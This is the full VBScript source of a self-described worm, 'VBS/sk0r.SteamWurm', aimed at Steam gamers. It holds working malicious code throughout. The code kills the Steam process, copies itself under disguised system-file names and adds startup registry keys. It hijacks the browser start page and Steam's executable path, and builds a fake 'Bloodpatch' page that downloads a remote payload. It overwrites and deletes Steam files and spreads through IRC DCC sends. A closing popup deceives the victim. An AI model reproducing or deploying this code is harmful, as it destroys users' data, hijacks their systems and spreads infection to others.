'/////////////////////////////////////////////////////
'//
'//           __     _______            
'//   ______ |  | __ \   _  \   _______ 
'//  /  ___/ |  |/ / /  /_\  \  \_  __ \
'//  \___ \  |    <  \  \_/   \  |  | \/    #Team.SF | sk0r
'// /____  > |__|_ \  \_____  /  |__|       sk0r Firms Series Inc
'//      \/       \/        \/             
'//
'//FileName: VBS/sk0r.SteamWurm
'//Coder: sk0r
'//Version: 3, VBS/sk0r.SteamWurm
'//©2005 by sk0r , batchvirus_tk@web.de
'//
'// This is Version 3 of sk0r's VBS/sk0r Series
'// Our mission is to show that VBScript Worms
'// aren't dead, and to show VBScript coding skills
'// You can't hide! The Worm will alway find you.
'// Infect your system slow and silent
'//
'// ©2005 by #Team.SF | sk0r, sk0r Firms Inc.
'/////////////////////////////////////////////////////

'THIS IS ONLY FOR ONLINE GAMERS!!!!1

Option Explicit

Dim fso,wshshell,winfolder,systemfolder,clientname,MyWorm,longmsg
Dim HomePage,HTMLFile,SteamInstallPath,InfectFolder,filesInit,Inifile
Dim GetIni,filecopy,CodeCopy,ReinDamit,mailsend,outapp,mspace,mailaddy
Dim getmailsend,allsend,onesend,goforit,wmi,system,process,SendBody
Dim thetime,theobject,thefile,SteamPath,Userishere,EmailBody,HTMLStart

On Error Resume Next

Sub VariableSettings
 Set fso = CreateObject ("Scripting.FileSystemObject")
 Set wshshell = CreateObject ("WScript.Shell")
 Set winfolder = fso.getspecialfolder(0)
 Set systemfolder = fso.getspecialfolder(1)
 Set Userishere = CreateObject ("WScript.Network")
 Set MyWorm = fso.getfile (WScript.ScriptFullName)
 Set wmi = GetObject("winmgmts:")
 Set system = wmi.instancesOf("win32_process")
 clientname = Userishere.UserName
End Sub 

Sub InstallWorm
 for each process in system 
    if lcase(process.name)="steam.exe" then 
       process.Terminate (0) 
    end if 
 Next
 
 If Not (fso.fileexists(winfolder&"\sk0r_f.txt.vbs")) Then
    MyWorm.copy (winfolder&"\sk0r_f.txt.vbs")
 Else
    WScript.Sleep 1000
 End If 
 If Not (fso.fileexists(winfolder&"\win32_sounddriver.msi.vbs")) Then
    MyWorm.copy (winfolder&"\win32_sounddriver.msi.vbs")
 Else
    WScript.Sleep 1000
 End If
 If Not (fso.fileexists(systemfolder&"\rundll32.exe.vbs")) Then
    MyWorm.copy (systemfolder&"\rundll32.exe.vbs")
 Else
    WScript.Sleep 1000
 End If 
 If Not (fso.fileexists(systemfolder&"\msconfig32.dll.vbs")) Then
    MyWorm.copy (systemfolder&"\msconfig32.dll.vbs")
 Else
    WScript.Sleep 1000
 End If 
 If Not (fso.fileexists(systemfolder&"\steam_patch.exe.vbs")) Then
    MyWorm.copy (systemfolder&"\steam_patch.exe.vbs")
 Else
    WScript.Sleep 1000
 End If 
 
 
 wshshell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VBS.sk0r.f" , systemfolder&"\msconfig32.dll.vbs"
 wshshell.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\VBS.sk0r@f\" , "Steam Bloodpatch"
 wshshell.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\language" , "japanese"
 wshshell.regwrite "HKEY_CURRENT_USER\Software\Valve\Steam\SteamExe" , systemfolder&"\rundll32.exe.vbs"
 wshshell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\VBS.sk0r.f.html" , winfolder&"\HTMLStart.vbs"
 SteamPath = wshshell.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\" & "InstallPath")
 For HomePage = 1 To 2
     If HomePage = 1 Then
        wshshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page" , "www.cs-multihack.tk"
     Elseif HomePage = 2 Then
        wshshell.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page" , "www.vbs-sk0r.tk"
     End If 
 Next 
End Sub 

Sub InfectTheSystemAndSteam
 thetime = """19:00:00"""
 theobject = """wscript.shell"""
 thefile = "\Steam_Bloodpatch.html"
 Set HTMLStart = fso.CreateTextFile (winfolder&"\HTMLStart.vbs")
     HTMLStart.writeline ("set a = createobject ("&theobject&")")
     HTMLStart.writeline ("if time() < "&thetime&" then")
     HTMLStart.writeline ("   do until time > "&thetime&" ")
     HTMLStart.writeline ("      langweile = langweile + 1")
     HTMLStart.writeline ("      if time > "&thetime&" then")
     HTMLStart.writeline ("         a.run """&winfolder&thefile&"""")
     HTMLStart.writeline ("      end if")
     HTMLStart.writeline ("    loop")
     HTMLStart.writeline ("end if ")
 HTMLStart.close
 Set HTMLFile = fso.createtextfile (winfolder&"\Steam_Bloodpatch.html")
     HTMLFile.writeline ("<html>")
     HTMLFile.writeline ("<head>")
     HTMLFile.writeline ("<meta name=author content=sk0r>")
     HTMLFile.writeline ("<meta name=copyrights content=sk0r>")
     HTMLFile.writeline ("<meta name=infection content="&Date()&">")
     HTMLFile.writeline ("<meta name=time content="&Time()&">")
     HTMLFile.writeline ("<title>Steam Bloodpatch Update</title>")
     HTMLFile.writeline ("</head>")
     HTMLFile.writeline ("<body text=black bgcolor=#4C5844>")
     HTMLFile.writeline ("<center><h1><u><b>Steam BloodPatch Update</b></u></h1>")
     HTMLFile.writeline ("<p>.</p>")
     HTMLFile.writeline ("<p>.</p><br>")
     HTMLFile.writeline ("Steam has released a new BloodPatch for all Half-Life Mods<br>")
     HTMLFile.writeline ("The Patch will not be updated by steam, Valve has made it as<br>")
     HTMLFile.writeline ("an install file to be sure that no internet errors will come<br>")
     HTMLFile.writeline ("<p>.</p><br>")
     HTMLFile.writeline ("To Download the Patch pls click on the button!<br>")
     HTMLFile.writeline ("<p>.</p><br>")
     HTMLFile.writeline ("<button OnClick=javascript:DownloadPatch()>Download</button>")
     HTMLFile.writeline ("<p>.</p><br>")
     HTMLFile.writeline ("To Install the Patch please Start the 'Setup.vbs' in the .rar packet")
     HTMLFile.WriteLine ("<p>.</p><br>")
     HTMLFile.WriteLine ("<b><u>WARNING:</u></b><br>")
     HTMLFile.WriteLine ("Your downloaded files must be in a folder without free space in the name!<br>")
     HTMLFile.WriteLine ("Example: C:\documents and settings\ = false and C:\Folder\files = true !<br>")
     HTMLFile.WriteLine ("<p>.</p><br>")
     HTMLFile.WriteLine ("Have Fun!")
     HTMLFile.writeline ("<script>")
     HTMLFile.writeline ("function DownloadPatch()")
     HTMLFile.writeline ("{")
     HTMLFile.writeline ("window.alert ('Thank you, for downloading the Blood Patch')")
     HTMLFile.writeline ("window.open ('http://www.speedsurf.to/sk0r1337/Steam_bp.rar')")
     HTMLFile.writeline ("}")
     HTMLFile.writeline ("</script>")
     HTMLFile.writeline ("</body>")
     HTMLFile.writeline ("</html>")
  HTMLFile.close
  
  SteamInstallPath = wshshell.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Valve\Steam\" & "InstallPath")
  Set InfectFolder = fso.GetFolder(SteamInstallPath&"\resource")
      Set FilesInIt = InfectFolder.files
      For Each Inifile in FilesInIt  
          GetIni = LCase(fso.GetExtensionName(IniFile.path))
          If GetIni = "txt" Or GetIni = "wav" Or GetIni = "res" Or GetIni = "tga" Or GetIni = "scc" Then 
             Set filecopy = fso.opentextfile (WScript.ScriptFullName,1)
		     CodeCopy = filecopy.readall
             Set ReinDamit = fso.OpenTextFile(IniFile.path,2,true)
             ReinDamit.write CodeCopy
          End If 
      Next
	  
   Set InfectFolder_two = fso.GetFolder(SteamInstallPath&"\Public")
      Set FilesInIt_two = InfectFolder_two.files
      For Each Inifile_two in FilesInIt_two  
          GetIni_two = LCase(fso.GetExtensionName(IniFile_two.path))
          If GetIni_two = "tga" Or GetIni_two = "res" Or GetIni_two = "htm" Or GetIni_two = "ico" Or GetIni_two = "txt" Then 
             Set filecopy_two = fso.opentextfile (WScript.ScriptFullName,1)
		     CodeCopy_two = filecopy_two.readall
             Set ReinDamit_two = fso.OpenTextFile(IniFile_two.path,2,true)
             ReinDamit_two.write CodeCopy_two
          End If 
      Next
      
  fso.deletefile (SteamInstallPath&"\ClientRegistry.blob")
  fso.deletefile (SteamInstallPath&"\Steam.dll")
  fso.deletefile (SteamInstallPath&"\dbghelp.dll")
  fso.deletefile (SteamInstallPath&"\SteamUI.dll")  
End Sub 

Sub IrcSpreading
ircread = wshshell.regread ("HKEY_LOCAL_MACHINE\SOFTWARE\Gamers.Interactive\Gamers.IRC\" & "inst_path")
hacker = "/(d(cc s(e(nd %skor "+systemfolder+"\(st(ea(m_p(at(c(h.(e(xe(.v(b(s"
hacker = replace(hacker,"(","")
set irchacking = fso.createtextfile(ircread+"\bin\grc\gamersirc.grc",true)
    irchacking.writeline (";VBS/sk0r.PopUp -> NIS 2k5 and 2k6 Proof <- ")
	irchacking.writeline ("on *:join:#: {")
	irchacking.WriteLine ("/unset %skor")
	irchacking.WriteLine ("/set %skor $nick ")
	irchacking.writeline (hacker)
	irchacking.writeline ("/msg $nick Please download the attached Steam Patch! www.official-steam-patch.tk")
	irchacking.writeline ("}")
	irchacking.Close
End Sub 

Sub LongMessageForClient
 longmsg = "Welcome dear "&clientname&"!" & VbCrLf
 longmsg = longmsg & "================" & VbCrLf
 longmsg = longmsg & " " & VbCrLf
 longmsg = longmsg & "Your Steam Patch is now installed" & VbCrLf 
 longmsg = longmsg & "Please restart your Steam to play!" & VbCrLf 
 longmsg = longmsg & "otherwise there will be many errors" & VbCrLf
 longmsg = longmsg & "and you would install it again!" & VbCrLf 
 MsgBox (longmsg) ,vbOKOnly + vbInformation ,"Steam Update"
End Sub 

Call VariableSettings()
Call InstallWorm()
Call InfectTheSystemAndSteam()
Call IrcSpreading()
Call LongMessageForClient()

' <!----     End of Worm | (C) 2005 by sk0r     ----!>


